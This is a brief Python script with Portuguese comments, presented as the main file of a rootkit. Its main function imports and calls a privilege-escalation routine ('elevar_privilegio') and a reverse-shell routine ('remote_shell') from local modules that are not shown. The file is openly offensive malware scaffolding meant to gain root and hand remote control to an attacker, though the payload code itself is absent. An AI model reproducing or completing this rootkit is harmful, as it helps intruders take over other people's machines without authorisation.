#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import socket
import subprocess
import string
import time
import random as r
import sys

# Importando outros rookit 
sys.path.append('./src/')
# Privilege escalation
from privilege_scalation import elevar_privilegio

# Reverse shell
from reverse_shell import remote_shell

# Função para verificar se o usuário é root
def check_root():
    return os.geteuid() == 0

# função principal rootkit 
def main(): 
    elevar_privilegio()
    remote_shell()

if __name__ == "__main__":
    main()
